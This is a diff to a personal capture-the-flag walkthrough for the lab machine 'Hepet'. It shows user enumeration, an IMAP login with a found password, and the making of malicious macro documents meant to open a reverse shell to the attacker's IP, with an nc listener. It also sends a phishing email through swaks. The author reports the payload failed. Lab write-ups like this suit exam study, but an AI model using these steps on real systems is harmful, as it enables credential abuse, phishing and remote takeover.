@@ -131,14 +131,103 @@ Okay. This writeup seems to help me out. I will return to this after temple.
 Try firstname only for creds, then try `telnet hepet 143`.
 
 ```
+users:
 agnes
 charlotte
 ela
 jonas
 magnus
 martha
+
+passwords:
+SicMundusCreatusEst
 ```
 
+Let's try `smtp-user-enum` like the banua guide suggests.
+
+```sh
+smtp-user-enum -M VRFY -U users.txt -t hepet
+```
+
+All the users exist.
+
+![](Pasted%20image%2020260503131410.png)
+
+We're going to telnet to the IMAP service on the victim.
+
+```sh
+telnet hepet 143
+
+a1 login "jonas" "SicMundusCreatusEst"
+
+a1 list "" *
+
+a1 select INBOX
+# 5 exist
+
+a1 fetch 2 body[text]
+
+```
+
+![](Pasted%20image%2020260503131703.png)
+
+> "All the spreadsheets and documents will be first processed in the mail server"
+
+This implies we can send an email to the victim with a malicious macro.
+
+```sh
+a1 fetch 2 body[header]
+```
+
+```txt
+From: "mailadmin@localhost" <mailadmin@localhost>
+To: "agnes@localhost" <agnes@localhost>
+Cc: "jonas@localhost" <jonas@localhost>,
+```
+
+So we need to phish `mailadmin@localhost`.
+
+[Our guide](https://banua.medium.com/proving-grounds-hepet-oscp-prep-2025-practice-17-3bdc3ad86495) suggests we should use this tool:
+
+- https://github.com/0bfxgh0st/MMG-LO/
+
+```sh
+git clone https://github.com/0bfxgh0st/MMG-LO/
+
+cd MMG-LO
+
+ip a |grep 192 # attacker ip = 192.168.49.54
+
+python ./mmg-ods.py windows 192.168.49.54 135
+# generates file.ods
+
+ls file.ods
+
+# start rev shell listener in new tab
+nc -nvlp 135
+```
+
+Now, how do we send `file.ods` to the victim?
+
+Apparently we use `swaks`.
+
+```sh
+sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server hepet --body "Please check this spreadsheet" --header "Subject: Please check this spreadsheet"
+```
+
+Now we need to wait a few minutes.
+
+It doesn't look like it's working. I'm going to try the `odt` version.
+
+```sh
+python ./mmg-odt.py windows 192.168.49.54 135
+
+sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.odt --server hepet --body "Please check this spreadsheet" --header "Subject: Please check this spreadsheet"
+```
+
+Also not working.  Our payload must have some problem with it.
+
+I'm stuck and am physically exhausted. I'm going to switch to a different box.
 
 ## Non-root access
 
